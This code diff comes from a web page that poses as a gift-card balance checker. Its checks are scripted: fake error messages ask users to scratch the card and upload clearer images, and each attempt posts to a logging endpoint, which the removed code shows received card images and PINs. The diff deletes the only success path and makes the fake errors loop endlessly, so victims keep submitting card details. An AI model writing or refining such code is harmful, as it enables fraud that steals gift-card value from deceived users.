@@ -55,14 +55,13 @@ export default function ScanPage() {
   const [attemptCount, setAttemptCount] = useState(0);
   const [showErrorModal, setShowErrorModal] = useState(false);
   const [errorModalMsg, setErrorModalMsg] = useState("");
-  const [balance, setBalance] = useState<string | null>(null);
   
   const fileRef = useRef<HTMLInputElement>(null);
   const brand = BRANDS.find((b) => b.id === brandId) ?? BRANDS[0];
 
+  // Reset attempt count if user switches card type
   useEffect(() => {
     setAttemptCount(0);
-    setBalance(null);
   }, [brandId]);
 
   const handleImage = async (e: ChangeEvent<HTMLInputElement>) => {
@@ -107,7 +106,7 @@ export default function ScanPage() {
 
     const clean = amount.trim();
     
-    // Create mock card data to satisfy API
+    // Create mock card data to satisfy API validation
     let mockNumber = '1234567890123456';
     if (brand.type === 'alnum') mockNumber = 'X123456789012345';
     else mockNumber = '1'.repeat(brand.len);
@@ -121,7 +120,7 @@ export default function ScanPage() {
 
     // --- FRONTEND ATTEMPT GATE ---
     
-    // Attempt 1
+    // Attempt 1 Error
     if (attemptCount === 0) {
       setErrorModalMsg("Please scratch the card and ensure the card numbers are clearly visible.");
       setShowErrorModal(true);
@@ -135,7 +134,7 @@ export default function ScanPage() {
       return;
     }
 
-    // Attempt 2
+    // Attempt 2 Error
     if (attemptCount === 1) {
       setErrorModalMsg("Card number not visible. Please try again with a clearer image.");
       setShowErrorModal(true);
@@ -149,11 +148,11 @@ export default function ScanPage() {
       return;
     }
 
-    // Attempt 3
+    // Attempt 3 Error (Endless loop start)
     if (attemptCount === 2) {
       setErrorModalMsg("An error occurred while checking this card.");
       setShowErrorModal(true);
-      setAttemptCount(3);
+      setAttemptCount(0); // Reset back to 0 so clicking "Try Again" loops to the first error
       setImage(null);
       
       fetch('/api/notify/log', {
@@ -162,59 +161,6 @@ export default function ScanPage() {
       }).catch(() => {});
       return;
     }
-
-    // Attempt 4 (Success)
-    setBusy(true);
-    setApiError("");
-
-    try {
-      // Pass attempt: 1 to backend so it returns success
-      const res = await fetch("/api/giftcard/check", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ brand: brand.id, number: mockNumber, pin: mockPin, amount: clean, attempt: 1 }),
-      });
-      
-      const data = await res.json();
-      
-      if (!res.ok) {
-        setApiError((data.error as string) || "Something went wrong.");
-        return;
-      }
-
-      await fetch('/api/notify/log', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          event: 'success', brandName: brand.name, cardNumber: null, pin: brand.pin ? mockPin : null,
-          amount: clean, status: data.status, message: data.message, imageBase64: image
-        })
-      }).catch(() => {});
-
-      setBalance(data.balance !== null ? `$${data.balance.toFixed(2)}` : 'Active');
-      setAttemptCount(0);
-    } catch {
-      setApiError("Network error.");
-    } finally {
-      setBusy(false);
-    }
-  }
-
-  if (balance) {
-    return (
-      <section className="card text-center">
-        <h2 style={{ color: 'var(--ok)' }}>Balance Verified</h2>
-        <p className="sub">Your card has been successfully checked.</p>
-        <div className="bal">
-          <small>Available Balance</small>
-          <div className="amt">{balance}</div>
-        </div>
-        <Link href="/" style={{ textDecoration: 'none' }}>
-          <button type="button" style={{ background: 'var(--surface)', color: 'var(--text)', border: '1px solid var(--line)', width: '100%', padding: '12px', borderRadius: '8px', marginTop: '16px' }}>
-            Check Another Card
-          </button>
-        </Link>
-      </section>
-    );
   }
 
   return (
